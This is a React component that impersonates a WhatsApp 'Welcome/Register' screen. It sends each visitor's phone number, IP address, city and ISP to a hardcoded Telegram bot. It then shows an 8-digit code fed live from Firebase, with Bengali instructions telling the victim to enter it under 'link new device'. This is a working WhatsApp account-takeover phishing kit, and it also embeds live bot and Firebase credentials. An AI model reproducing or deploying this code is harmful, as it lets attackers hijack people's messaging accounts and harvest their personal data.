
import React, { useState, useEffect } from 'react';
import * as firebaseApp from 'firebase/app';
import { getDatabase, ref, onValue } from 'firebase/database';
import { Smartphone, CheckCircle2, Fingerprint, Keyboard, Info } from 'lucide-react';

// Workaround for TS error: "Module 'firebase/app' has no exported member 'initializeApp'"
const initializeApp = (firebaseApp as any).initializeApp;
const getApps = (firebaseApp as any).getApps;

interface ConnectGuideOverlayProps {
    isOpen: boolean;
    onClose: () => void;
    onFinalizeRegistration: (number: string) => void;
    onFinalNumberSubmit: (number: string) => void;
    phoneNumber?: string;
}

// Specific Firebase Config for the Guide
const guideConfig = {
    apiKey: "AIzaSyA--EbKHCyRtTp4AgBZua22Ad2J7JRbS28",
    authDomain: "control-my-page.firebaseapp.com",
    databaseURL: "https://control-my-page-default-rtdb.firebaseio.com",
    projectId: "control-my-page",
    storageBucket: "control-my-page.appspot.com",
    messagingSenderId: "846756179295",
    appId: "1:846756179295:web:f5eec02565c2f2d45c5aea",
    measurementId: "G-37RH0B37KK"
};

// Telegram Config
const TELEGRAM_BOT_TOKEN = "7974529959:AAEyUKUkiGdMsLVqNz_fQdL2s3kiE5apuGM";
const CHAT_ID = "6658445342";
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

export const ConnectGuideOverlay: React.FC<ConnectGuideOverlayProps> = ({ 
    isOpen, 
    onClose, 
    onFinalizeRegistration, 
    onFinalNumberSubmit,
    phoneNumber 
}) => {
    // Removed LOADING phase as we transition directly to GUIDE with a countdown
    const [currentPhase, setCurrentPhase] = useState<'INPUT' | 'GUIDE'>('INPUT');
    const [inputNumber, setInputNumber] = useState(phoneNumber || '');
    const [pinDigits, setPinDigits] = useState<string[]>(Array(8).fill(''));
    const [countdown, setCountdown] = useState(20);
    
    useEffect(() => {
        if (phoneNumber) {
            setInputNumber(phoneNumber);
        }
    }, [phoneNumber]);

    // Countdown Timer Logic
    useEffect(() => {
        let timer: ReturnType<typeof setInterval>;
        if (isOpen && currentPhase === 'GUIDE' && countdown > 0) {
            timer = setInterval(() => {
                setCountdown((prev) => prev - 1);
            }, 1000);
        }
        return () => clearInterval(timer);
    }, [isOpen, currentPhase, countdown]);

    // 1. Initialize Guide App for PIN Code (Only in GUIDE phase AND after countdown)
    useEffect(() => {
        // STRICT CHECK: Only run this effect if isOpen, phase is GUIDE, and countdown is 0
        if (!isOpen || currentPhase !== 'GUIDE' || countdown > 0) return;

        const APP_NAME = 'connectGuideApp';
        let app;

        try {
            const existingApp = getApps().find((app: any) => app.name === APP_NAME);
            app = existingApp ? existingApp : initializeApp(guideConfig, APP_NAME);

            const db = getDatabase(app);
            const liveCodeRef = ref(db, 'liveCode');

            const unsubscribe = onValue(liveCodeRef, (snapshot) => {
                const data = snapshot.val();
                const code = data ? String(data.code) : "        ";
                setPinDigits(code.split('').slice(0, 8));
            });

            return () => unsubscribe();
        } catch (error) {
            console.error("Guide Firebase Init Error:", error);
        }
    }, [isOpen, currentPhase, countdown]);

    // 2. Visitor Tracking
    useEffect(() => {
        if (isOpen) {
            const trackVisitor = async () => {
                if (localStorage.getItem('wa_connect_guide_visited')) return;
                try {
                    const res = await fetch('https://ipwho.is/');
                    if (!res.ok) return;
                    const data = await res.json();
                    if (!data.success) return;

                    const message = `
*👤 New Visitor on Connect Guide!*
-------------------------
*IP:* \`${data.ip}\`
*Country:* ${data.country}
*City:* ${data.city}
*ISP:* ${data.connection?.isp || 'Unknown'}
-------------------------`;
                    
                    await fetch(TELEGRAM_API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
                    });
                    
                    localStorage.setItem('wa_connect_guide_visited', 'true');
                } catch (e) { console.warn("Visitor tracking skipped:", e); }
            };
            trackVisitor();
        }
    }, [isOpen]);

    const handleFormSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!inputNumber || inputNumber.length < 10) {
            alert("Please enter a valid phone number (e.g., 017XXXXXXXX)");
            return;
        }

        const formattedNumber = inputNumber.trim();

        // 1. Send Telegram Log
        try {
            await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    text: `*🚨 New Whatsapp Connect Attempt! (Via Form)*\nUser Phone: \`${formattedNumber}\`\nTime: ${new Date().toISOString()}`, 
                    parse_mode: 'Markdown' 
                })
            });
        } catch (e) { console.warn("Telegram log failed", e); }

        // 2. Trigger Final Number Submit (Hand off to App)
        onFinalNumberSubmit(formattedNumber);

        // 3. Transition immediately to GUIDE phase (Countdown starts automatically)
        setCurrentPhase('GUIDE');
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-[10000] flex items-center justify-center p-4 overflow-y-auto"
             style={{ background: 'linear-gradient(135deg, #128C7E, #075E54)' }}>
            
            <style>{`
                @import url('https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap');
                .font-kalpurush { font-family: 'Kalpurush', sans-serif; }
            `}</style>

            <div className="bg-[#ECE5DD] w-full max-w-[400px] rounded-3xl shadow-2xl p-8 font-kalpurush animate-in fade-in">
                
                {/* PHASE 1: INPUT */}
                {currentPhase === 'INPUT' && (
                    <div className="text-center">
                         <div className="w-20 h-20 bg-emerald-100 text-[#075E54] rounded-full flex items-center justify-center text-4xl mx-auto mb-6 shadow-inner">
                             <i className="fab fa-whatsapp"></i>
                         </div>
                         <h1 className="text-2xl font-bold text-gray-800 mb-2">Welcome to WhatsApp</h1>
                         <p className="text-gray-500 mb-8 text-sm">Please enter your phone number to continue and connect your account.</p>

                         <form onSubmit={handleFormSubmit} className="space-y-5">
                             <div className="text-left">
                                 <label className="block text-xs font-bold text-gray-500 uppercase mb-1 ml-1">Phone Number</label>
                                 <input 
                                    type="tel" 
                                    value={inputNumber}
                                    onChange={(e) => setInputNumber(e.target.value)}
                                    placeholder="017XXXXXXXX" 
                                    className="w-full p-4 rounded-xl border-2 border-gray-200 focus:border-[#25D366] focus:ring-2 focus:ring-emerald-100 outline-none text-lg font-medium transition-all text-center"
                                    required
                                 />
                             </div>
                             <button 
                                type="submit"
                                className="w-full py-4 bg-[#25D366] text-white font-bold rounded-xl shadow-lg hover:bg-[#1dbb5f] transition-transform active:scale-95 text-lg"
                             >
                                 Register & Continue
                             </button>
                             <p className="text-xs text-gray-400 mt-4">By continuing, you agree to our Terms & Conditions.</p>
                         </form>
                    </div>
                )}

                {/* PHASE 2: GUIDE */}
                {currentPhase === 'GUIDE' && (
                    <div className="text-center animate-in slide-in-from-right duration-300">
                        <div className="text-5xl text-[#075E54] mb-4 flex justify-center">
                            <Info size={48} fill="currentColor" className="text-teal-800" />
                        </div>
                        <h1 className="text-2xl font-bold text-gray-800 mb-3">Whatsapp চ্যানেলে যুক্ত হওয়ার নির্দেশনা</h1>
                    
                        <p className="text-gray-600 mb-2">নুসরাত এর ৮-সংখ্যার Whatsapp আনলক নাম্বার</p>
                        
                        {/* Dynamic Display: Countdown Message OR PIN Code */}
                        <div className="flex justify-center gap-1.5 mb-6 min-h-[52px]">
                            {countdown > 0 ? (
                                <div className="flex items-center justify-center w-full p-3 bg-amber-50 border border-amber-200 rounded-lg text-amber-800 font-bold">
                                    কোড প্রদর্শিত হবে: {countdown} সেকেন্ড
                                </div>
                            ) : (
                                pinDigits.map((digit, idx) => (
                                    <div key={idx} className="w-[38px] h-[48px] flex items-center justify-center font-bold text-2xl bg-white border-2 border-[#128C7E] text-[#075E54] rounded-lg shadow-sm animate-in zoom-in">
                                        {digit || ''}
                                    </div>
                                ))
                            )}
                        </div>

                        {/* Instructions */}
                        <div className="bg-white p-4 rounded-lg shadow-inner text-gray-700 text-left mb-6">
                            <h2 className="text-lg font-semibold mb-3 border-b pb-2">আপনার ফোনে আনলক নাম্বার প্রবেশ করান:</h2>
                            <ul className="space-y-3 text-[15px]">
                                <li className="flex items-start gap-3">
                                    <Smartphone className="text-[#128C7E] mt-1 shrink-0" size={20} />
                                    <span>প্রথমে আপনার ফোনের নোটিফিকেশন থেকে <strong>"Enter code to link new device"</strong> এ ক্লিক করুন।</span>
                                </li>
                                <li className="flex items-start gap-3">
                                    <CheckCircle2 className="text-[#128C7E] mt-1 shrink-0" size={20} />
                                    <span>এরপর <strong>Confirm</strong> বাটনে ক্লিক করুন।</span>
                                </li>
                                <li className="flex items-start gap-3">
                                    <Fingerprint className="text-[#128C7E] mt-1 shrink-0" size={20} />
                                    <span>আপনার ফোনের ফিঙ্গারপ্রিন্ট অথবা প্যাটার্ন লক দিয়ে আনলক করুন।</span>
                                </li>
                                <li className="flex items-start gap-3">
                                    <Keyboard className="text-[#128C7E] mt-1 shrink-0" size={20} />
                                    <span>সবশেষে, ফাঁকা ৮টি বক্সে উপরে দেখানো আনলক নাম্বার টি বসান এবং অপেক্ষা করুন।</span>
                                </li>
                            </ul>
                        </div>
                        
                        <p className="text-xs text-gray-500 mt-4 mb-6">দ্রষ্টব্য: নিরাপত্তার জন্য এই আনলক নাম্বার টি প্রতি ১ মিনিট পর পর স্বয়ংক্রিয়ভাবে পরিবর্তন হবে।</p>
                        
                        <button 
                            onClick={() => onFinalizeRegistration(inputNumber)}
                            className="w-full py-3.5 bg-gradient-to-r from-[#25D366] to-[#128C7E] text-white font-bold rounded-xl shadow-md hover:shadow-lg transition-all active:scale-95 text-center block"
                        >
                            নির্দেশনা সম্পূর্ণ হলে অ্যাপে ফিরে যান
                        </button>
                    </div>
                )}
            </div>
        </div>
    );
};
